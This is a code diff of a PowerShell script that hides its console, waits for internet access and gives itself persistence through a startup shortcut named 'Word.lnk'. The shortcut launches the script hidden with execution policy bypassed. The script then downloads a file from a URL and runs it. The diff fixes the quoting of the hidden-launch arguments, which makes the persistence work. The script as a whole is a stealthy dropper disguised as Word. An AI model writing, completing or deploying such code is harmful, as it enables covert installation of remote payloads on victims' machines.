@@ -16,7 +16,6 @@ function Hide-Console {
 
 function Test-InternetConnection {
     try {
-        # Ping Google DNS (8.8.8.8)
         $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
         return $pingResult
     } catch {
@@ -32,13 +31,11 @@ function Wait-ForInternet {
 
 function Add-ToStartup {
     $scriptPath = $MyInvocation.MyCommand.Definition
-
     $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
-
     $WshShell = New-Object -ComObject WScript.Shell
     $shortcut = $WshShell.CreateShortcut("$startupFolder\Word.lnk")
     $shortcut.TargetPath = "Word.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath""
+    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
 }
 
@@ -56,3 +53,4 @@ Wait-ForInternet
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 
 Start-Process -FilePath $outputFile
+
